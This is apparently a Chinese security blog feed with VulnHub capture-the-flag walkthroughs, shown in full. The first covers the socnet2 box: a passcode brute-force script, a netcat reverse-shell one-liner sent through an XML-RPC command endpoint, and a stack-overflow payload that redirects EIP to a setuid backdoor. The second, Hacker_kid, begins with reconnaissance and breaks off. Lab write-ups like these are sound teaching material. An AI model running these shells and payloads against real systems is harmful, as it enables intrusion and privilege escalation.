plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd socnet</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122114956833.png" alt="image-20211122114956833"></p><p>发现了名为<strong>monitor.py</strong>的脚本，难免会想到之前在网站页面内admin用户的留言描述为后台运行的用来监视服务器的<strong>python脚本</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102735643.png" alt="image-20211118102735643"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep monitor</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124093318091.png" alt="image-20211124093318091"></p><p>查看进程发现monitor.py在运行 那么不妨查看一下该文件代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat monitor.py</span><br></pre></td></tr></table></figure><p>简单分析一下：</p><blockquote><p>#my remote server management API #备注为远程管理的API<br>import SimpleXMLRPCServer #导入了XMLRPC的库<br>import subprocess #创建进程<br>import random #生成随机数</p><p>debugging_pass &#x3D; random.randint(1000,9999) #生成1000-9999区间的随机数</p><p>def runcmd(cmd):          #定义函数runcmd和变量cmd<br>    results &#x3D; subprocess.Popen(cmd, shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE)  </p><p>#创建新的进程 执行变量cmd 启用一个新的shell执行命令 并将shell的输出和报错信息都定义为新的变量<br>    output &#x3D; results.stdout.read() + results.stderr.read()<br>    return output</p><p>#使用output变量统一将结果输出到页面</p><p>def cpu():<br>    return runcmd(“cat &#x2F;proc&#x2F;cpuinfo”)</p><p>#定义变量cpu 调用runcmd函数执行cat &#x2F;proc&#x2F;cpuinfo查看cpu相关信息</p><p>def mem():<br>    return runcmd(“free -m”)</p><p>#查看操作系统内存大小使用情况</p><p>def disk():<br>    return runcmd(“df -h”)</p><p>#查看当前系统磁盘存储</p><p>def net():<br>    return runcmd(“ip a”)</p><p>#查看当前网络配置信息</p><p>def secure_cmd(cmd,passcode):<br>    if passcode&#x3D;&#x3D;debugging_pass:<br>         return runcmd(cmd)<br>    else:<br>        return “Wrong passcode.”</p><p>#<strong>判断校验passcode变量 若相同则可执行命令</strong></p><p>server &#x3D; SimpleXMLRPCServer.SimpleXMLRPCServer((“0.0.0.0”, 8000))    #联想到8000端口页面的请求报错信息<br>server.register_function(cpu)<br>server.register_function(mem)<br>server.register_function(disk)<br>server.register_function(net)<br>server.register_function(secure_cmd)</p><p>server.serve_forever()</p></blockquote><p>搜索了解一下XML-RPC</p><p>（<a href="https://docs.python.org/zh-cn/3/library/xmlrpc.html%EF%BC%89">https://docs.python.org/zh-cn/3/library/xmlrpc.html）</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124094504425.png" alt="image-20211124094504425"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124095619187.png" alt="image-20211124095619187"></p><p>结合monitor.py和示例客户端代码，进行调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi a.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124111612734.png" alt="image-20211124111612734"></p><blockquote><p>import xmlrpc.client</p><p>with xmlrpc.client.ServerProxy(“<a href="http://10.0.2.12:8000/&quot;">http://10.0.2.12:8000/&quot;</a>) as proxy:<br>       print(str(proxy.cpu()))</p></blockquote><p>执行测试是否可行(在shell里不好编辑，可用蚁剑上传)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 a.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124105602436.png" alt="image-20211124105602436"></p><p>成功打印出cpu信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi b.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124112829598.png" alt="image-20211124112829598"></p><blockquote><p>import xmlrpc.client</p><p>with xmlrpc.client.ServerProxy(“<a href="http://10.0.2.12:8000/&quot;">http://10.0.2.12:8000/&quot;</a>) as proxy:</p><p>​for p in range(1000,10000):</p><pre><code>  r = str(proxy.secure_cmd(&#39;whoami&#39;,p))</code></pre><p>​if not “Wrong” in r:</p><p>​print(p)</p><p>​print(r)</p><p>​break</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 b.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124112719226.png" alt="image-20211124112719226"></p><p>执行成功，passcode为1447</p><p>kali端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124141525887.png" alt="image-20211124141525887"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi c.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124141640107.png" alt="image-20211124141640107"></p><blockquote><p>import xmlrpc.client</p><p>with xmlrpc.client.ServerProxy(“<a href="http://10.0.2.12:8000/&quot;">http://10.0.2.12:8000/&quot;</a>) as proxy:<br>   cmd &#x3D; “rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 10.0.2.4 5555 &gt;&#x2F;tmp&#x2F;f”<br>   r &#x3D; str(proxy.secure_cmd(cmd,1447))<br>   print(r)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 c.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124141913344.png" alt="image-20211124141913344"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;           #优化shell</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124142428803.png" alt="image-20211124142428803"></p><p>查看socnet用户目录下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124142732587.png" alt="image-20211124142732587"></p><h3 id="二次提权"><a href="#二次提权" class="headerlink" title="二次提权"></a>二次提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file add_record</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124143037766.png" alt="image-20211124143037766"></p><p>发现该文件可执行且其属主账号为root</p><p>再看目录下的peda文件</p><p>peda是基于python的动态调试脚本</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145232452.png" alt="image-20211124145232452"></p><p>执行add_record程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./add_record</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145559990.png" alt="image-20211124145559990"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145716660.png" alt="image-20211124145716660"></p><p>简单测试了下该程序的各个功能</p><p>同时也发现当前目录下生成了类似于日志文件 查看它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat employee_records.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145917807.png" alt="image-20211124145917807"></p><p>针对每一个可以提交数据的点进行测试，测试是否存在内存溢出等问题</p><p>使用gdb（能够对程序运行中寄存器、堆栈、内存、函数调用、数据变化等使用情况进行详细的跟踪、判断)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151021962.png" alt="image-20211124151021962"></p><p>生成500个A并复制粘贴测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print(&#x27;A&#x27;*500)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151203410.png" alt="image-20211124151203410"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151247420.png" alt="image-20211124151247420"></p><p>程序正常退出了 没有产生异常溢出情况</p><p>对剩下的输入点进行测试</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151456339.png" alt="image-20211124151456339"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151545051.png" alt="image-20211124151545051"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151631593.png" alt="image-20211124151631593"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124152138188.png" alt="image-20211124152138188"></p><p>功夫不负有心人，在最后发现explain变量没有对内存做良好的限制导致溢出，这里重点关注寄存器EIP（EIP 寄存器里存储的是<strong>CPU下次要执行的指令的地址</strong>。）已经被填满，那就需要精确的知道寄存器EIP中的四个A的位置，若是知道就可以尝试在此位置执行payload</p><p>经过对数量进行测试 ：</p><p>发现300个、200个、100个都会造成溢出，但50个不会，已经缩小了范围。</p><p>接下来生成一段特征字符(连续的每四个字符都不相同)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 100</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124153203054.png" alt="image-20211124153203054"></p><p>再将其输入至explain使其溢出</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124153409310.png" alt="image-20211124153409310"></p><p>可以直观的看到寄存器EIP位置内的数据为AHAA</p><blockquote><p>AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2A<strong>AHAA</strong>dAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern search</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124153749453.png" alt="image-20211124153749453"></p><p>得到寄存器EIP的偏移量位置为62，即从第63个字符开始就会进入寄存器EIP中</p><p>生成62个A用来占位 再添加BCDE 再次用来验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print(&#x27;A&#x27;*62+&#x27;BCDE&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124154441052.png" alt="image-20211124154441052"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124154528961.png" alt="image-20211124154528961"></p><p>到此可以确定，已经可以精准的向寄存器EIP内写入</p><p>补充：在CPU内存储数据时是倒序存储的    ASCII码：42–B 43–C 44–D 45–E</p><p>查看汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas main</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124162244701.png" alt="image-20211124162244701"></p><p>调用了fopen可能是用于打开文件的 put输出内容 print显示</p><p>在调用put函数之前的地址0x0804873d设置断点，进一步观察</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break * 0x0804873drd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124162444002.png" alt="image-20211124162444002"></p><p>添加断点后运行程序可以发现提前触及了断点</p><p>单步执行（每次只执行一个cpu指令）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ s</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124162836920.png" alt="image-20211124162836920"></p><p>可以看到这里执行了程序的欢迎语，</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124163004119.png" alt="image-20211124163004119"></p><p>那么就可以确定在此开始程序的第一步</p><p>同个增加断点单步运行逐个尝试其他调用功能，将其对应起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ del 1  #删除断点</span><br></pre></td></tr></table></figure><p>寻找一个调用printf的位置在其之前设置断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break * 0x0804877b</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124163823804.png" alt="image-20211124163823804"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124164219850.png" alt="image-20211124164219850"></p><p>经过逐个的尝试 对该程序的程序逻辑有了更具体的了解</p><p>姓名： 0x08048750 &lt;+120&gt;:   call   0x8048480 &lt; printf@plt &gt;           </p><p>工作年限：0x0804877c &lt;+164&gt;:   call   0x8048480 &lt; printf@plt &gt;</p><p>工资：0x080487a4 &lt;+204&gt;:   call   0x8048480 &lt; printf@plt &gt;</p><p>是否有问题：0x080487cc &lt;+244&gt;:   call   0x8048480 &lt; printf@plt &gt;</p><p>若有为1 问题解释：0x08048810 &lt;+312&gt;:   call   0x8048480 &lt; printf@plt &gt;</p><p>在查看的过程中发现一则调用</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124165222750.png" alt="image-20211124165222750"></p><p>在0x08048834位置调用了vuln 首先这不是一个熟知的函数 其次函数名后没有@plt标识 又顾名思义难免联想到脆弱点等 猜测这是软件开发者自己写的函数</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124165344555.png" alt="image-20211124165344555"></p><p>查看当前程序中内嵌的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info func</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124170306580.png" alt="image-20211124170306580"></p><p>发现setuid函数，结合之前ls -l查看add_record文件的权限和所属者是root的信息，猜测使用这个函数调用系统权限  看到的system函数是否可以执行操作系统指令呢？ backdoor “后门”？存在一系列疑问，也渐渐有了方向</p><p>分别查看这个几个函数在程序中有什么动作？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas vuln</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124170831901.png" alt="image-20211124170831901"></p><p>对strcpy函数进行搜索，该函数曾存在缓冲区溢出漏洞</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124171130950.png" alt="image-20211124171130950"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas backdoor</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124171814589.png" alt="image-20211124171814589"></p><p>调用了setuid函数提权，调用了system函数执行指令，</p><p>思考：我们需要对system函数进行跟踪，则需要记录下起始的内存地址（0x08048676），通过程序的正常执行，通过explain变量注入的数据，在62个字节之后，如果能把该地址写入EIP寄存器中，EIP寄存器就会读取该地址下的所有指令，并分别执行setuid、system指令，紧接着可以通过设置断点，单步跟进到system指令，查看其执行了什么命令，是否有可利用的点？来实现提权的目标。</p><p>思路：</p><p>主程序会调用执行vuln函数–&gt;vuln函数又调用了存在缓冲区溢出漏洞的内嵌函数strcpy–&gt;但主程序内并未调用backdoor函数–&gt;所以利用主程序内加载的vuln函数中的strcpy函数的缓冲区溢出漏洞–&gt;向EIP寄存器内写入backdoor的起始内存加载地址–&gt;以执行backdoor函数–&gt;执行setuid函数、执行system函数–&gt;执行system函数中的操作系统指令–&gt;有没有可能注入payload–&gt;完成本地提权？</p><p>向EIP寄存器内写入backdoor的起始内存加载地址（定向到payload内）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import struct; print(&#x27;zz\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot; &gt; payload</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124174848606.png" alt="image-20211124174848606"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ q     #退出调试器</span><br></pre></td></tr></table></figure><p>回到目标靶机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">。r b r</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124175728595.png" alt="image-20211124175728595"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record    #重新打开gdb调试</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r &lt; payload</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124175923850.png" alt="image-20211124175923850"></p><p>结果耐人寻味：产生了两个新的进程，4312执行了程序&#x2F;bin&#x2F;dash ，4313执行了程序&#x2F;bin&#x2F;bash</p><p>为什么产生这样的结果?去分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ q     #退出调试器</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record    #重新打开gdb调试</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas main</span><br></pre></td></tr></table></figure><p>尝试在调用vuln前增加断点单步分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break vuln</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r &lt; payload</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124181204165.png" alt="image-20211124181204165"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ s       #进行单步执行         </span><br></pre></td></tr></table></figure><p>在进行多次单步执行调试后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124192251868.png" alt="image-20211124192251868"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;靶机地址:&lt;/strong&gt; &lt;a href=&quot;https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova&quot;&gt;https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;难度等级: 高&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打靶目标:&lt;/strong&gt; 取得 root 权限&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考链接:&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.python.org/zh-cn/3/library/xmlrpc.html&quot;&gt;https://docs.python.org/zh-cn/3/library/xmlrpc.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-7-Hacker_kid</title>
    <link href="http://example.com/2022/04/12/week7/"/>
    <id>http://example.com/2022/04/12/week7/</id>
    <published>2022-04-12T07:08:45.030Z</published>
    <updated>2022-04-12T07:11:24.716Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>靶机：<a href="https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova">https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova</a><br>  难度：中<br>  目标：取得root权限</p></blockquote><span id="more"></span><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig #查看本机kali的IP地址 192.168.137.22</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230104424569.png" alt="image-20211230104424569"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230104521562.png" alt="image-20211230104521562"></p><p>发现目标主机192.168.137.244</p><h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.137.244 #扫描目标开放的端口</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230104655243.png" alt="image-20211230104655243"></p><h3 id="3-服务探测"><a href="#3-服务探测" class="headerlink" title="3.服务探测"></a>3.服务探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- -sV 192.168.137.244 #扫描端口服务信息</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211230104738596.png" alt="image-20211230104738596">从扫描结果来看，</p><p>53端口 domain域名服务（DNS）</p><p>80端口 Apache web服务</p><p>9999端口 Tornado(基于Python的轻量Web框架)</p><p>53端口是DNS域名解析使用的域名服务，通常会使用tcp和udp：</p><p>tcp的53端口一般用于同域内两台域名服务器之间的数据同步、交换</p><p>udp的53端口一般用于客户端向DNS服务器查询域名</p><p>由于<strong>nmap默认只扫描tcp端口</strong>，所以使用-sU参数扫描验证udp端口53</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p53 -sU -sV 10.0.2.15</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230104932514.png" alt="image-20211230104932514"></p><p>确实开放了udp53端口</p><p>一台DNS服务器上可能包含多个DNS区域</p><p>尝试对ISC BIND 9.16.1搜索，发现有远程代码执行漏洞（CVE-20208625，CVE-202125216），但未找到exp</p><h2 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h2><h3 id="1-访问80端口"><a href="#1-访问80端口" class="headerlink" title="1.访问80端口"></a>1.访问80端口</h3><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230105728056.png" alt="image-20211230105728056"></p><p>根据页面信息 像是一名小黑客的留言..</p><p>发现”More you will DIG me,more you will find me on your servers..DIG me more…DIG me more” 这句话</p><p>联想到Linux下的DNS管理中 存在DIG命令 </p><p>分别再对Start App Form三个链接进行点击 </p><p>Start：</p><p>在访问Start页面时的URL为：<a href="http://192.168.137.244/index.html">http://192.168.137.244/index.html</a></p><p>尝试将index.html 更改后缀为 index.php</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230110654234.png" alt="image-20211230110654234"></p><p>发现页面正常解析为相同的主页–说明目标应该是用的PHP语言开发环境</p><p>App：</p><p>在访问Start页面时的URL为：<a href="http://192.168.137.244/index.php#app.html">http://192.168.137.244/index.php#app.html</a></p><p>尝试访问：<a href="http://192.168.137.244/app.html">http://192.168.137.244/app.html</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230111419115.png" alt="image-20211230111419115"></p><p>发现一个类似于应用示例的界面，经过对页面的尝试后，也未发现直接可利用点。</p><p>App：</p><p>在访问Start页面时的URL为：<a href="http://192.168.137.244/index.php#form.html">http://192.168.137.244/index.php#form.html</a></p><p>尝试访问：<a href="http://192.168.137.244/form.html">http://192.168.137.244/form.html</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230111727097.png" alt="image-20211230111727097"></p><p>仍未发现可直接利用的突破点。</p><p>将思路转回到首页页面的提示信息–DIG</p><p>但若想利用DIG命令 就必须知道相关的域名信息</p><p>查看源码，在注释内发现了信息</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230112257460.png" alt="image-20211230112257460"></p><p>在URL内构造</p><p><a href="http://192.168.137.244/?page_no=2">http://192.168.137.244?page_no=2</a></p><p>并打开Burpsuite配置，进行截取，发送至Intruder</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230112700774.png" alt="image-20211230112700774"></p><p>对page_no&#x3D;x 处尝试爆破</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230112831248.png" alt="image-20211230112831248"></p><p>选择数字字典</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230113028498.png" alt="image-20211230113028498"></p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230113236472.png" alt="image-20211230113236472"></p><p>结果显示 似乎当page_no&#x3D;21时，页面会有不同的响应</p><p>访问<a href="http://192.168.137.244/?page_no=21">http://192.168.137.244/?page_no=21</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230113507952.png" alt="image-20211230113507952"></p><p>页面下方的信息提示：该小黑客为了方便自己可以随时连接该服务器，创建了一个子域，其中一个名为hackers.blackhat.local</p><h3 id="2-DNS区域传输"><a href="#2-DNS区域传输" class="headerlink" title="2.DNS区域传输"></a>2.DNS区域传输</h3><p>绑定hosts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230114008595.png" alt="image-20211230114008595"></p><p>绑定完成后访问hackers.blackhat.local发现和直接用IP访问没有什么区别</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230114342113.png" alt="image-20211230114342113"></p><p>hackers.blackhat.local只是在blackhat.local DNS区域内的一条主机记录，那是否有更多的主机记录</p><p>所以尝试绑定一下hosts</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230114703747.png" alt="image-20211230114703747"></p><p>结合DIG 